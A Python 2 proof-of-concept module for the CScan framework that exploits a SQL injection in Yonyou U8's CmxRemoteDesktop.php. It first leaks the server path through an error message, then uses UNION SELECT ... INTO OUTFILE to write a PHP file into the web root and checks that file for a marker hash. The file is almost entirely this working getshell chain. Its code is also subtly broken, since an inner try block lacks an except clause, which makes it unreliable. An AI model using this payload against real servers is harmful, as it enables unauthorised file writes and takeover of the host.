# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import os
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'yongyou_0036' # 平台漏洞编号，留空
    name = '用友优谱u8系统.getshell CmxRemoteDesktop.php' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-10-13'  # 漏洞公布时间
    desc = '''
        用友优谱u8系统.getshell CmxRemoteDesktop.php无限制getshell
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0125807' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = '用友'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3e60d1bb-84cf-4c3b-9fb7-18d011629451'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload="/Server/CmxRemoteDesktop.php?pgid=App_Show&ID=1'"
            target = arg + payload
            code1, head1, res1, errcode1, _url1 = hh.http(target)
            try:
                m = re.findall('<b>(.*?)</b>',res1)
                shell_path = str(os.path.dirname(m[1])) + '\\md5.php'
                shell_path = re.sub(r'\\',r'\\\\',shell_path)
                payload="/Server/CmxRemoteDesktop.php?pgid=App_Show&ID=1%20union%20select%201,2,3,'\<\?php%20echo%20md5(123);\?\>',5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3%20into%20outfile%20'{shell_path}'".format(shell_path=shell_path)
                exp_url=arg+payload
                code, head, res, errcode, _url = hh.http(exp_url)
                verify_url = arg + 'Server/md5.php'
                code, head, res, errcode, _url = hh.http(verify_url)
                if code == 200 and '202cb962ac59075b964b07152d234b70' in res: 
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()